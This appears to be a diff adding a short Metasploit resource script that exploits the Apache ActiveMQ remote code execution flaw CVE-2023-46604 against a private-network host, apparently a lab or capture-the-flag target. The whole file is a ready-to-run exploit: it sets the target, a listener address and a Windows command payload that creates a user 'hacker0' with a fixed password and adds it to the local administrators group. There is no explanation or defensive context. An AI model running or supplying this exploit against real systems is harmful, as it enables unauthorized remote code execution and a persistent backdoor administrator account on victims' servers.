@@ -1,0 +1,8 @@
+use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
+set RHOSTS 10.129.230.70
+set RPORT 61616
+set LHOST 10.10.14.2
+set LPORT 4444
+set payload cmd/windows/generic
+set CMD cmd /c "net user hacker0 P@ssw0rd123! /add && net localgroup administrators hacker0 /add"
+run
